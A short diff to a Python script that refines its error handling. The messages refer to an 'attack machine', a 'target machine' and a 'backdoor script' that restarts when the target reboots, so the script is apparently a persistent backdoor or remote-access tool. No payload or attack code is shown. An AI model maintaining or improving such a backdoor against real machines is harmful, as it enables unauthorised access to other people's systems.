@@ -43,6 +43,8 @@ def main():
 if __name__ == '__main__':
     try:
         main()
-    except:
+    except OSError:
+        print('The socket used by the attack machine has not yet closed. Please wait a little and try to run the script again.')
+    except Exception:
         print('Some error has occured which has broken the socket connection between the target and attack machine.')
         print('To regain access, the target machine must reboot to run the backdoor script again.')
